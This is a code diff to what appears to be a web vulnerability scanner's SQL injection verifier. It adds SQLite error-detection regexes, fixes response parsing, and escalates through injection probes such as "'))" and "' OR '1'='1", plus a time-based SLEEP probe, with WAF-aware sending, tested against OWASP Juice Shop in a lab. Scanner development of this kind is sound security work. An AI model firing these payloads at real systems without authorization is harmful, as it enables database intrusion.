@@ -33,7 +33,11 @@ _SQLI_ERROR_PATTERNS = [
     r"you have an error in your sql syntax", r"warning: mysql", r"unclosed quotation mark",
     r"quoted string not properly terminated", r"pg::syntax", r"ora-\d{4,5}:",
     r"microsoft ole db provider for odbc drivers", r"syntax error.*at or near",
-    r"unterminated string literal", r"sqlstate\["
+    r"unterminated string literal", r"sqlstate\[",
+    # SQLite (e.g. OWASP Juice Shop) and broader generic signatures — the
+    # original set missed SQLite entirely (Run #26 lab verification).
+    r"sqlite_?error", r"sqlite3?::", r'near ".*": syntax error',
+    r"sql syntax.*error|syntax error.*sql", r"odbc.*driver.*sql",
 ]
 _SQLI_ERROR_RE = re.compile("|".join(_SQLI_ERROR_PATTERNS), re.IGNORECASE)
 _SQLI_TIME_THRESHOLD_S = 3.0  # 3s is enough margin over typical response times
@@ -94,24 +98,42 @@ class VulnVerifier:
                 return urlunparse(parsed._replace(path="/" + "/".join(parts), fragment="")), original
         return None
 
-    def _get_resp_body(self, outcome: ActionOutcome) -> str:
-        r = getattr(outcome, "response", None)
-        return str(getattr(r, "body", None) or getattr(r, "text", None) or "") if r else ""
+    def _get_resp_body(self, outcome) -> str:
+        # waf_aware_send returns (MutationResponse, ActionOutcome, bypassed).
+        # Callers bind position 0 (the MutationResponse) into a variable named
+        # `outcome` — so .body lives DIRECTLY here, NOT under an inner
+        # `.response`. The previous code looked for outcome.response.body and
+        # silently returned "" → SQL-error regex never matched (Run #26 lab).
+        if outcome is None:
+            return ""
+        body = getattr(outcome, "body", None)
+        if body is None:
+            body = getattr(outcome, "text", None) or ""
+        return str(body)
 
     async def _confirm_sqli(self, engine: MutationEngine, url: str, headers: Dict[str, str], cookies: Dict[str, str], budget: int) -> Tuple[List[Tuple[float, str, str, str]], int]:
         results, probes = [], 0
         params = [k for k, _ in parse_qsl(urlparse(url).query or "", keep_blank_values=True)]
         if not params: return results, probes
 
-        # Error-based
-        for param in params[:min(budget, 2)]:
-            probe_url = self._inject_query_param(url, param, "'")
-            payload = MutationPayload(value="'", encoding=PayloadEncoding.NONE, vuln_class=VulnerabilityClass.SQLI, description="SQLi error probe")
-            outcome, _, _ = await waf_aware_send(engine, probe_url, payload, method=HttpMethod.GET, headers={**headers, "Cookie": "; ".join(f"{k}={v}" for k, v in cookies.items())})
-            probes += 1
-            body = self._get_resp_body(outcome)
-            if _SQLI_ERROR_RE.search(body):
-                return [(0.92, f"SQLi error response: {body[:100]}", f"' in {param}", "SQLi")], probes
+        # Error-based: a bare "'" often returns empty rather than erroring
+        # (e.g. Juice Shop's search needs "'))"), so escalate through common SQL
+        # boundary contexts until one trips a DB syntax error (Run #26).
+        cookie_hdr = "; ".join(f"{k}={v}" for k, v in cookies.items())
+        send_headers = {**headers, **({"Cookie": cookie_hdr} if cookie_hdr else {})}
+        for param in params[:2]:
+            for probe in ("'", "'))", "\")", "' OR '1'='1", "1)) OR ((1=1"):
+                if probes >= budget:
+                    break
+                probe_url = self._inject_query_param(url, param, probe)
+                payload = MutationPayload(value=probe, encoding=PayloadEncoding.NONE, vuln_class=VulnerabilityClass.SQLI, description=f"SQLi error probe {probe!r}")
+                outcome, _, _ = await waf_aware_send(engine, probe_url, payload, method=HttpMethod.GET, headers=send_headers)
+                probes += 1
+                body = self._get_resp_body(outcome)
+                if _SQLI_ERROR_RE.search(body):
+                    return [(0.92, f"SQLi error response to {probe!r}: {body[:120]}", f"{probe} in {param}", "SQLi")], probes
+            if probes >= budget:
+                break
 
         # Time-based
         if probes < budget and params:
@@ -121,7 +143,8 @@ class VulnVerifier:
             payload = MutationPayload(value=sleep_payload, encoding=PayloadEncoding.NONE, vuln_class=VulnerabilityClass.SQLI, description="SQLi time-based probe")
             outcome, _, _ = await waf_aware_send(engine, probe_url, payload, method=HttpMethod.GET, headers={**headers, "Cookie": "; ".join(f"{k}={v}" for k, v in cookies.items())})
             probes += 1
-            elapsed = float(getattr(getattr(outcome, "response", None), "elapsed_s", 0) or 0)
+            # MutationResponse exposes .elapsed_ms (ms, not seconds) directly.
+            elapsed = float(getattr(outcome, "elapsed_ms", 0) or 0) / 1000.0
             if elapsed >= _SQLI_TIME_THRESHOLD_S:
                 results.append((0.88, f"Time-based SQLi: took {elapsed:.1f}s", f"SLEEP(5) in {param}", "SQLi"))
 
